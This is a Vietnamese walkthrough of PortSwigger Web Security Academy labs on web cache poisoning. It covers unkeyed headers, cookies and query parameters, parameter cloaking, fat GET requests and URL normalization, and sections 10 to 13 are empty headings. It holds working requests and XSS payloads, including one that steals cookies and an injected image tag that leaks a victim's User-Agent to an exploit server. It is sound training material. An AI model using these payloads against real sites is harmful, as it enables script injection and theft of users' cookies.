# 1. Web cache poisoning with an unkeyed header
Nhận thấy `Host` HTTP header được reflected trong đoạn tracker script:

```
<script type="text/javascript" src="//0a67006403f76056c172df6000b30077.web-security-academy.net/resources/js/tracking.js"></script>
```
Thử thêm header `X-Forwarded-Host: abc.com` thì thấy đoạn script trở thành:
```
<script type="text/javascript" src="//abc.com/resources/js/tracking.js"></script>
```
Và server sẽ lưu cache trong thời gian 30s. Như vậy, để thực thi đoạn script `alert(document.cookie)`, ta vào exploit server và cấu hình đoạn body `alert(document.cookie)`, với header `Content-Type: application/javascript`, sau đó để path là `/resources/js/tracking.js`.

Submit request với header `X-Forwarded-Host: https://exploit-0aa1003b03e760a1c112deb4012a0067.exploit-server.net` cho đến khi kết quả được reflected trong response (khi cache hết hạn). Kết quả thành công.

# 2. Web cache poisoning with an unkeyed cookie
Website có cookie "fehost=prod-cache-01", được reflected trong response như sau:
```
<script>
    data = {
        "host":"0a6b00a5031f6272c0c895f1009600fe.web-security-academy.net",
        "path":"/",
        "frontend":"prod-cache-01"
    }
</script>
```

Thử thay đổi `cookie=prod-cache-01"</script>`, submit đến khi response mới được lưu vào cache. Nhận thấy dấu nháy kép và dấu đóng mở tag được cho phép, khiến ta có thể escape javascript string và script tag.

Bắt request với Burp Repeater, thử thay đổi `cookie=prod-cache-01"}</script><script>alert(1)</script>` rồi đợi đến khi cache hết hạn và submit. Kết quả bài lab được giải.

# 3. Web cache poisoning with multiple headers
Nhận thấy khi thêm header `X-Forwarded-Scheme: http`, server sẽ trả về response như sau:
```
HTTP/1.1 302 Found
Location: https://0a64003d036f1d8cc00df4bd002f00b9.web-security-academy.net/
...
```
Như vậy server tự động redirect tới URL sử dụng protocol https. Thử thêm header `X-Forwarded-Host: abc.com`, thì header Location trở thành: `Location: https://abc.com`. Đồng thời, ta thấy 2 header `X-Forwarded-Host` và `X-Forwarded-Scheme` là unkeyed header đối với cache.

Vào exploit server, cấu hình đoạn javascript và đặt path là `/resources/js/tracking.js`. Sau đó dùng Burp Repeater cấu hình request với header:
```
GET /resources/js/tracking.js HTTP/1.1
Host: 0a64003d036f1d8cc00df4bd002f00b9.web-security-academy.net
X-Forwarded-Scheme: http
X-Forwarded-Host: exploit-0a4f008b03de1df6c0b5f3c5017d0029.exploit-server.net
....
```
Khi đó response thu được là:
```
HTTP/1.1 302 Found
Location: https://exploit-0a4f008b03de1df6c0b5f3c5017d0029.exploit-server.net/resources/js/tracking.js
....
```
Khi browser của nạn nhân load file `/resources/js/tracking.js`, thì file tracking.js trong exploit server (thực thi lệnh alert) sẽ được load thay vì file tracking.js của server chứa lỗ hổng. Thực hiện gửi request đến khi response được lưu vào cache. Bài lab được giải thành công.

# 4. Targeted web cache poisoning using an unknown header
Trong bài lab này, vẫn có chức năng tracking bằng javascript như trước. Tuy nhiên ta không thể exploit bằng cách sử dụng header `X-Forwarded-Host` và `X-Forwarded-Scheme`.

Sử dụng extension "Param Miner" của BurpSuite, ta phát hiện domain name của tracking script có thể bị thay đổi sử dụng header `X-Host`. Thêm header `X-Host: abc.com`, nhận thấy đoạn script trở thành:
```
<script type="text/javascript" src="//abc.com/resources/js/tracking.js"></script>
```

Như vậy ta đã tìm được cách inject mã độc vào response. Trong response có header `Vary: User-Agent`, là cache sẽ được trả về cho user với User-Agent tương ứng. Vậy tiếp theo ta cần xác định User-Agent của victim user.

Trong chức năng comment cho phép comment chứa HTML code. Ta submit comment với nội dung:
```
<img src="https://exploit-0ac700b8049a5594c1d1de6d011a003c.exploit-server.net/?data=useragent">
```
Vào Access Log của Exploit server, ta lấy được User-Agent của victim:
```
03:25:46 +0000 "GET /data=useragent HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.119 Safari/537.36"
```
Vậy, ta cấu hình request với các headers:
```
GET / HTTP/1.1
Host: 0a210087044e5550c155dfef009b007e.h1-web-security-academy.net
X-Host: exploit-0ac700b8049a5594c1d1de6d011a003c.exploit-server.net
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.119
...
```
Submit request đến khi đảm bảo response được lưu vào trong cache. Kết quả, bài lab được giải.

# 5. Web cache poisoning via an unkeyed query string
Nhận thấy trong website có một canonical link tag reflect lại domain của wesbite. Thử gửi request `GET /?x=abc`, nhận thấy trong response có header `X-Cache: hit`. Như vậy, query string là một unkeyed field trong cache.

Submit request `GET /?x=abc` đến khi response được lưu vào trong cache. Ta thấy thẻ canonical link trở thành
```
<link rel="canonical" href='//0a0100de03c5e4ebc00631e5008b0038.web-security-academy.net/?x=abc'/>
```

Như vậy, ta có thể escape string và HTML để inject Javascript code. Gửi request `GET /?x='/><script>alert(1)</script>` đến khi response được lưu vào trong cache, kết quả thành công.

# 6. Web cache poisoning via an unkeyed query parameter
Trong home page có một canonical link giống như bài lab trước. Tuy nhiên, thử với hai request `GET /?x=a` và `GET /?x=b` thì ta nhận thấy cache miss, tức là cache trả về response dựa trên query string.

Thử gửi liên tiếp hai request `GET /?utm_content=a` và `GET /?utm_content=b`, nhận thấy cache hit. Như vậy riêng với query parameter `utm_content` là unkeyed đối với cache. Khi đó canonical link trở thành:
```
<link rel="canonical" href='//0a8b007c04c5f667c5f2901d00be00ba.web-security-academy.net/?utm_content=b'/>
```

Gửi request `/?utm_content=b'><script>alert(1)</script>` đến khi response được lưu vào trong cache, kết quả thành công.

# 7. Parameter cloaking
Trong home page có thẻ script
```
<script type="text/javascript" src="/js/geolocate.js?callback=setCountryCookie">
```
Truy cập `/js/geolocate.js?callback=setCountryCookie` ta được response như sau
```
const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
setCountryCookie({"country":"United Kingdom"});
```
Nhận thấy khi thay đổi query parameter `callback=abc` thì dòng cuối cùng cũng thay đổi thành `abc({"country":"United Kingdom"});`. Như vậy với `callback=alert(1);` thì sẽ có lỗi XSS xảy ra.

Gửi request `GET /js/geolocate.js?callback=setCountryCookie&utm_content=abc` thì cache trả về trạng thái hit. Như vậy query parameter `utm_content` là unkeyed đối với cache. 

Thử gửi request `GET /js/geolocate.js?callback=setCountryCookie&utm_content=abc;callback=test` thì dòng javascript cuối cùng trở thành `test({"country":"United Kingdom"});`. Như vậy, ta có thể sử dụng cách này để thay đổi query parameter `callback` mà vẫn khiến cache hit xảy ra.

Ta exploit parameter cloaking bằng cách cấu hình request `GET /js/geolocate.js?callback=setCountryCookie&utm_content=abc;callback=alert(1);`. Gửi request đến khi response được lưu vào cache, kết quả bài lab được giải.

# 8. Web cache poisoning via a fat GET request
Trong home page của website có thẻ script 
```
<script type="text/javascript" src="/js/geolocate.js?callback=setCountryCookie">
```
Truy cập `/js/geolocate.js?callback=setCountryCookie` ta được response như sau
```
const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
setCountryCookie({"country":"United Kingdom"});
```
Nhận thấy khi thay đổi query parameter `callback=abc` thì dòng cuối cùng cũng thay đổi thành `abc({"country":"United Kingdom"});`. Như vậy với `callback=alert(1);` thì sẽ có lỗi XSS xảy ra.

Ta cấu hình một "fat" GET request như sau:
```
GET /js/geolocate.js?callback=setCountryCoookie
Host: 0a7c00bb049def96c066409d00210084.web-security-academy.net
X-HTTP-Method-Override: POST
....

callback=alert(1);
```
Nhận thấy cache vẫn trả về trạng thái hit. Đợi đến khi cache hết hạn rồi submit, ta thấy `alert(1);` đã xuất hiện trong response. Kết quả bài lab được giải.

# 9. URL normalization
Truy cập một URL ngẫu nhiên, ví dụ `/hello` thì thấy lỗi hiển thị `Not Found: /hello`. Dùng Burp Repeater để bắt request rồi gửi GET request đến `/hello#<script>alert(1)</script>`, ta thấy thẻ script được thêm vào response: `Not Found: /hello#<script>alert(1)</script>`.

Tuy nhiên, do trình duyệt sẽ tự động URL encode các ký tự đặc biệt nên truy cập vào URL trên bằng browser, các ký tự đặc biệt trong payload của ta sẽ bị encode và không thực thi được. Nhận thấy sau khi gửi request `/hello#<script>alert(1)</script>`, rồi sau đó gửi tiếp request `/hello?%23%3Cscript%3Ealert%281%29%3C%2Fscript%3E` thì Cache trả về trạng thái hit. Như vậy, cache không coi hai URL có encode và không encode là khác nhau. Ta có thể exploit Cache Poisoning như sau:

1) Đầu tiên, gửi request `/hello#<script>alert(1)</script>` bằng Burp Repeater => response chứa tag script được lưu vào trong cache
2) Do Cache có max-age=10, nên trong 10 giây tiếp theo, ta deliver link `/hello%23%3Cscript%3Ealert%281%29%3C%2Fscript%3E` cho victim. Khi victim truy cập link này, response trả về sẽ nằm trong cache và lệnh `alert(1)` được thực thi 

Sau khi submit, kết quả thành công.

# 10. Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria

# 11. Combining web cache poisoning vulnerabilities

# 12. Cache key injection

# 13. Internal cache poisoning

